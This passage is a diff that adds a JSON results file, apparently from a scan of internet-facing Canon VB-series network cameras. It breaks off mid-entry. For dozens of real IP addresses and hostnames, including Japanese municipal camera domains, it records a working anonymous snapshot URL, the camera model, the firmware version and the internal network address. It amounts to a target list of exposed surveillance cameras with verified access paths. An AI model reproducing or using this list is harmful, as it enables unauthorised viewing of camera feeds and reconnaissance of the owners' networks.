@@ -1,0 +1,3182 @@
+{
+  "82.130.141.93:80": {
+    "host": "82.130.141.93",
+    "port": 80,
+    "url": "http://82.130.141.93:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://82.130.141.93:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 24121,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M40 Ver. 1.2.1",
+      "model": "VB-M40",
+      "internal_ip": "=192.168.1.100:80",
+      "auth_required_count": 4
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://82.130.141.93:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "webcam.bakio.eus:80": {
+    "host": "webcam.bakio.eus",
+    "port": 80,
+    "url": "http://webcam.bakio.eus/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://webcam.bakio.eus:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 18031,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M40 Ver. 1.2.1",
+      "model": "VB-M40",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://webcam.bakio.eus:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "206.72.28.209:80": {
+    "host": "206.72.28.209",
+    "port": 80,
+    "url": "http://206.72.28.209:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://206.72.28.209:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 99065,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M42 Ver. 1.0.0",
+      "model": "VB-M42",
+      "internal_ip": "=206.72.28.209:80",
+      "auth_required_count": 3
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://206.72.28.209:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "monzen.city.wajima.ishikawa.jp:80": {
+    "host": "monzen.city.wajima.ishikawa.jp",
+    "port": 80,
+    "url": "http://monzen.city.wajima.ishikawa.jp/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://monzen.city.wajima.ishikawa.jp:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 19327,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M40 Ver. 1.0.2",
+      "model": "VB-M40",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://monzen.city.wajima.ishikawa.jp:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "202.174.60.121:80": {
+    "host": "202.174.60.121",
+    "port": 80,
+    "url": "http://202.174.60.121:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://202.174.60.121:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 3774,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M42 Ver. 1.0.0",
+      "model": "VB-M42",
+      "internal_ip": "=192.168.1.10:80",
+      "auth_required_count": 3
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://202.174.60.121:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "cam13.kaifu-intra.jp:80": {
+    "host": "cam13.kaifu-intra.jp",
+    "port": 80,
+    "url": "http://cam13.kaifu-intra.jp:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://cam13.kaifu-intra.jp:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 17206,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-R10VE Ver. 1.0.9",
+      "model": "VB-R10VE",
+      "internal_ip": "=172.30.5.205:80",
+      "auth_required_count": 3
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://cam13.kaifu-intra.jp:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "183.77.125.199:80": {
+    "host": "183.77.125.199",
+    "port": 80,
+    "url": "http://183.77.125.199:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://183.77.125.199:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 7100,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-S900F Ver. 1.0.0",
+      "model": "VB-S900F",
+      "internal_ip": "=192.168.24.100:80",
+      "auth_required_count": 3
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://183.77.125.199:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "61.122.58.10:80": {
+    "host": "61.122.58.10",
+    "port": 80,
+    "url": "http://61.122.58.10:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://61.122.58.10:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 9158,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M40 Ver. 1.1.1",
+      "model": "VB-M40",
+      "internal_ip": "=10.1.52.50:80",
+      "auth_required_count": 4
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://61.122.58.10:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "camera.town.owani.lg.jp:80": {
+    "host": "camera.town.owani.lg.jp",
+    "port": 80,
+    "url": "http://camera.town.owani.lg.jp/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://camera.town.owani.lg.jp:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 7305,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M42 Ver. 1.1.0",
+      "model": "VB-M42",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://camera.town.owani.lg.jp:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "218.42.253.97:80": {
+    "host": "218.42.253.97",
+    "port": 80,
+    "url": "http://218.42.253.97:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://218.42.253.97:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 47880,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M42 Ver. 1.1.0",
+      "model": "VB-M42",
+      "internal_ip": "=192.168.0.60:80",
+      "auth_required_count": 3
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://218.42.253.97:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "110.4.179.61:80": {
+    "host": "110.4.179.61",
+    "port": 80,
+    "url": "http://110.4.179.61:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://110.4.179.61:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 50009,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M740E Ver. 1.0.0",
+      "model": "VB-M740E",
+      "internal_ip": "=192.168.1.31:80",
+      "auth_required_count": 3
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://110.4.179.61:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "122.249.124.12:80": {
+    "host": "122.249.124.12",
+    "port": 80,
+    "url": "http://122.249.124.12:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://122.249.124.12:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 16822,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M42 Ver. 1.1.0",
+      "model": "VB-M42",
+      "internal_ip": "=192.168.179.103:80",
+      "auth_required_count": 3
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://122.249.124.12:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "68.66.157.38:80": {
+    "host": "68.66.157.38",
+    "port": 80,
+    "url": "http://68.66.157.38:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://68.66.157.38:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 258047,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-S900F Ver. 1.0.0",
+      "model": "VB-S900F",
+      "internal_ip": "=68.66.157.38:80",
+      "auth_required_count": 3
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://68.66.157.38:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "camera6.town.minabe.lg.jp:80": {
+    "host": "camera6.town.minabe.lg.jp",
+    "port": 80,
+    "url": "http://camera6.town.minabe.lg.jp/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://camera6.town.minabe.lg.jp:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 3238,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M40 Ver. 1.1.1",
+      "model": "VB-M40",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://camera6.town.minabe.lg.jp:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "cam04.kaifu-intra.jp:80": {
+    "host": "cam04.kaifu-intra.jp",
+    "port": 80,
+    "url": "http://cam04.kaifu-intra.jp:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://cam04.kaifu-intra.jp:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 8150,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-R10VE Ver. 1.0.9",
+      "model": "VB-R10VE",
+      "internal_ip": "=172.30.2.201:80",
+      "auth_required_count": 3
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://cam04.kaifu-intra.jp:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "219.111.32.223:80": {
+    "host": "219.111.32.223",
+    "port": 80,
+    "url": "http://219.111.32.223:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://219.111.32.223:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 12570,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-H41 Ver. 1.1.0",
+      "model": "VB-H41",
+      "internal_ip": "=192.168.30.250:80",
+      "auth_required_count": 3
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://219.111.32.223:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "camera.town.itayanagi.aomori.jp:80": {
+    "host": "camera.town.itayanagi.aomori.jp",
+    "port": 80,
+    "url": "http://camera.town.itayanagi.aomori.jp:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://camera.town.itayanagi.aomori.jp:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 43782,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M620D Ver. 1.1.0",
+      "model": "VB-M620D",
+      "internal_ip": "=10.7.113.54:80",
+      "auth_required_count": 3
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://camera.town.itayanagi.aomori.jp:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "124.155.113.18:80": {
+    "host": "124.155.113.18",
+    "port": 80,
+    "url": "http://124.155.113.18:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://124.155.113.18:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 9100,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M40 Ver. 1.0.3",
+      "model": "VB-M40",
+      "internal_ip": "=192.168.11.10:80",
+      "auth_required_count": 4
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://124.155.113.18:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "kairyu-marina.aa0.netvolante.jp:80": {
+    "host": "kairyu-marina.aa0.netvolante.jp",
+    "port": 80,
+    "url": "http://kairyu-marina.aa0.netvolante.jp/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://kairyu-marina.aa0.netvolante.jp:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 10939,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M42 Ver. 1.0.0",
+      "model": "VB-M42",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://kairyu-marina.aa0.netvolante.jp:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "cam09.kaifu-intra.jp:80": {
+    "host": "cam09.kaifu-intra.jp",
+    "port": 80,
+    "url": "http://cam09.kaifu-intra.jp:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://cam09.kaifu-intra.jp:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 11152,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-R10VE Ver. 1.0.9",
+      "model": "VB-R10VE",
+      "internal_ip": "=172.30.5.201:80",
+      "auth_required_count": 3
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://cam09.kaifu-intra.jp:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "nywebcam05.city.nayoro.hokkaido.jp:80": {
+    "host": "nywebcam05.city.nayoro.hokkaido.jp",
+    "port": 80,
+    "url": "http://nywebcam05.city.nayoro.hokkaido.jp:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://nywebcam05.city.nayoro.hokkaido.jp:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 27859,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-R11VE Ver. 1.0.0",
+      "model": "VB-R11VE",
+      "internal_ip": "=192.168.10.108:80",
+      "auth_required_count": 3
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://nywebcam05.city.nayoro.hokkaido.jp:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "camera5.city.satsumasendai.lg.jp:80": {
+    "host": "camera5.city.satsumasendai.lg.jp",
+    "port": 80,
+    "url": "http://camera5.city.satsumasendai.lg.jp:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://camera5.city.satsumasendai.lg.jp:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 29657,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-H41 Ver. 1.1.1",
+      "model": "VB-H41",
+      "internal_ip": "=192.168.1.104:80",
+      "auth_required_count": 3
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://camera5.city.satsumasendai.lg.jp:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "cam11.kaifu-intra.jp:80": {
+    "host": "cam11.kaifu-intra.jp",
+    "port": 80,
+    "url": "http://cam11.kaifu-intra.jp:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://cam11.kaifu-intra.jp:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 9797,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-R10VE Ver. 1.0.9",
+      "model": "VB-R10VE",
+      "internal_ip": "=172.30.5.203:80",
+      "auth_required_count": 3
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://cam11.kaifu-intra.jp:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "cam06.kaifu-intra.jp:80": {
+    "host": "cam06.kaifu-intra.jp",
+    "port": 80,
+    "url": "http://cam06.kaifu-intra.jp:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://cam06.kaifu-intra.jp:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 16301,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-R10VE Ver. 1.0.9",
+      "model": "VB-R10VE",
+      "internal_ip": "=172.30.3.202:80",
+      "auth_required_count": 3
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://cam06.kaifu-intra.jp:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "220.157.181.27:80": {
+    "host": "220.157.181.27",
+    "port": 80,
+    "url": "http://220.157.181.27:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://220.157.181.27:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 36780,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M40 Ver. 1.1.0",
+      "model": "VB-M40",
+      "internal_ip": "=192.168.100.99:80",
+      "auth_required_count": 4
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://220.157.181.27:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "118.21.134.31:80": {
+    "host": "118.21.134.31",
+    "port": 80,
+    "url": "http://118.21.134.31:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://118.21.134.31:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 238542,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M600D Ver. 1.0.4",
+      "model": "VB-M600D",
+      "internal_ip": "=192.168.11.215:80",
+      "auth_required_count": 4
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://118.21.134.31:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "218.45.5.68:80": {
+    "host": "218.45.5.68",
+    "port": 80,
+    "url": "http://218.45.5.68:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://218.45.5.68:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 3228,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M40 Ver. 1.1.1",
+      "model": "VB-M40",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://218.45.5.68:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "58.94.26.108:80": {
+    "host": "58.94.26.108",
+    "port": 80,
+    "url": "http://58.94.26.108:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://58.94.26.108:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 10914,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M42 Ver. 1.0.0",
+      "model": "VB-M42",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://58.94.26.108:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "camera1.city.satsumasendai.lg.jp:80": {
+    "host": "camera1.city.satsumasendai.lg.jp",
+    "port": 80,
+    "url": "http://camera1.city.satsumasendai.lg.jp/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://camera1.city.satsumasendai.lg.jp:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 14169,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M42 Ver. 1.2.0",
+      "model": "VB-M42",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://camera1.city.satsumasendai.lg.jp:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "camera3.city.satsumasendai.lg.jp:80": {
+    "host": "camera3.city.satsumasendai.lg.jp",
+    "port": 80,
+    "url": "http://camera3.city.satsumasendai.lg.jp/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://camera3.city.satsumasendai.lg.jp:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 28288,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M40 Ver. 1.2.1",
+      "model": "VB-M40",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://camera3.city.satsumasendai.lg.jp:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "219.111.32.220:80": {
+    "host": "219.111.32.220",
+    "port": 80,
+    "url": "http://219.111.32.220/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://219.111.32.220:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 5471,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M42 Ver. 1.1.0",
+      "model": "VB-M42",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://219.111.32.220:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "210.237.44.45:80": {
+    "host": "210.237.44.45",
+    "port": 80,
+    "url": "http://210.237.44.45:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
